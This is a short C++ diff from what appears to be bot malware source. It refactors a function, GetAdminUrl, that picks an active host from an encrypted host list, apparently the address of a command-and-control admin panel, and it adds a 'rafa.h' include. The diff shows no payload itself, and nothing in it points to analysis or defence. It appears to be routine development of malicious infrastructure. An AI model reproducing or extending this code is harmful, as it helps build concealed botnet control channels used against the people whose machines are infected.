@@ -13,6 +13,9 @@
 #include "BotDebug.h"
 #include "BotHTTP.h"
 #include "Config.h"
+#include "rafa.h"
+
+
 
 namespace DBGRAFADLL
 {
@@ -1263,7 +1266,7 @@ static char* GetAdminUrl( char* url )
 #ifdef DEBUGCONFIG
 	m_lstrcpy( url, panelaz );
 #else
-	string host = GetActiveHostFromBuf2( RAFA_HOSTS, 0x86D19DC3 /* __RAFA_HOSTS__ */, RAFAHOSTS_PARAM_ENCRYPTED );
+	string host = GetActiveHostFromBuf2(Rafa::Hosts(), 0x86D19DC3 /* __RAFA_HOSTS__ */, RAFAHOSTS_PARAM_ENCRYPTED );
 	if( !host.IsEmpty() )
 		m_lstrcpy( url, host.t_str() );
 	else
